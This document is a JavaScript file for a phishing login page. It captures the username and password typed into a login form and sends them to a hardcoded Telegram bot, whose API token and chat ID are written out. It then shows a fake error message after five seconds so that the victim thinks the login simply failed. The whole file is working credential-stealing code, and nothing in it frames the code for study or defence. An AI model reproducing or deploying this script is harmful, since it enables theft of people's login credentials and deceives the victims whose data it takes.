const TELEGRAM_BOT_API_URL = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
const CHAT_ID = "1339653142";

document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch(TELEGRAM_BOT_API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `Login Attempt:\nUsername: ${username}\nPassword: ${password}`
        })
    })
    .then(response => {
        // إظهار الرسالة بعد 5 ثوانٍ
        setTimeout(() => {
            const errorMessage = document.getElementById("errorMessage");
            errorMessage.style.display = "block";
        }, 5000);
    })
    .catch(error => {
        console.error("Error:", error);
    });
});
